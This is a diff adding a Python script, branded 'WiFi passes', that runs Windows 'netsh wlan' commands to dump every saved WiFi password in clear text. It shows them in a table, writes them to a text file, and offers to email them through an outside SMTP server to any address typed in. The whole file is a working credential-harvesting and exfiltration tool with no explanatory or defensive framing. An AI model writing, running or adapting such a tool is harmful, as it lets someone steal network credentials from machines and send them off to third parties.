@@ -1,0 +1,102 @@
+import subprocess
+import time
+from prettytable import PrettyTable
+import smtplib as smtp
+
+
+opt = ""
+logo = """
+\033[1;35m
+ ##   ##  ######      ###   ######                                               
+ ##   ##    ##       ##       ##                                                 
+ ##   ##    ##       ##       ##              #####     ####     #####    #####  
+ ## # ##    ##     ######     ##              ##  ##       ##   ##       ##      
+ #######    ##       ##       ##              ##  ##    #####    ####     ####   
+  ## ##     ##       ##       ##              #####    ##  ##       ##       ##  
+  ## ##   ######     ##     ######            ##        #####   #####    #####   
+                                              ##                                 
+\033[1;31m
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~\033[1;32m [\033[1;33m+\033[1;32m]\033[1;36m DEVELOPED By \033[1;31m(\033[1;33mDrPatroleum\033[1;31m) ~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+"""
+
+options = """\033[1;32m [\033[1;33m1\033[1;32m]\033[1;36m Show WiFi passwords \033[1;31m
+\033[1;32m [\033[1;33m2\033[1;32m]\033[1;36m Write WiFi passwords to .txt file \033[1;31m
+\033[1;32m [\033[1;33m3\033[1;32m]\033[1;36m Send WiFi passwords by e-mail \033[1;31m
+\033[1;32m [\033[1;33m4\033[1;32m]\033[1;36m Exit program \033[1;31m"""
+
+
+data = subprocess.check_output(
+    ['netsh', 'wlan', 'show', 'profiles']).decode('cp852').split('\n')
+WiFis = [line.split(':')[1][1:-1]
+         for line in data if "All User Profile" in line]
+passes = []
+tab = PrettyTable()
+tab.field_names = ["SSID", "PASSWORD"]
+
+
+def get_wifi_passes():
+    for WiFi in WiFis:
+        results = subprocess.check_output(
+            ['netsh', 'wlan', 'show', 'profile', WiFi, 'key=clear']).decode('cp852').split('\n')
+        results = [line.split(':')[1][1:-1]
+                   for line in results if 'Key Content' in line]
+        try:
+            passes.append(f'SSID: {WiFi}, Password: {results[0]}')
+            tab.add_row([WiFi, results[0]])
+        except IndexError:
+            passes.append(f'SSID: {WiFi}, No password!')
+            tab.add_row([WiFi, "No password!"])
+
+
+def make_a_file():
+    file = open("wifi_passes.txt", "w")
+    file.write(str(tab))
+    file.close()
+    print("\nSuccessfully saved wifi_passes.txt!")
+
+
+def send_mail():
+    email = 'yourmail@mail.com'
+    password = 'secret_password'
+    dest_email = input(
+        "\nEnter the e-mail address to which the password will be sent: ")
+    subject = 'As you wish!'
+    email_text = (str(tab))
+    message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(
+        email, dest_email, subject, email_text)
+    server = smtp.SMTP_SSL('smtp.gazeta.pl')
+    server.set_debuglevel(1)
+    server.ehlo(email)
+    server.login(email, password)
+    server.auth_plain()
+    server.sendmail(email, dest_email, message)
+    server.quit()
+    print("E-mail sent!")
+
+
+print(logo)
+print('Starts searching for WiFi passes on this computer.  ', flush=True, end='\r')
+time.sleep(1)
+print('Starts searching for WiFi passes on this computer.. ', flush=True, end='\r')
+time.sleep(1)
+print('Starts searching for WiFi passes on this computer...', flush=True, end='\r')
+time.sleep(1)
+
+get_wifi_passes()
+
+print("\nFound " + str(len(passes)) + " WiFi passwords!")
+print("\n" + options)
+
+while opt != "4":
+    opt = input("\nChoose an option:  ")
+    if opt == "1":
+        print(tab)
+    if opt == "2":
+        make_a_file()
+    if opt == "3":
+        send_mail()
+    if opt == "4":
+        print("\nThank you, see you later!")
+        exit()
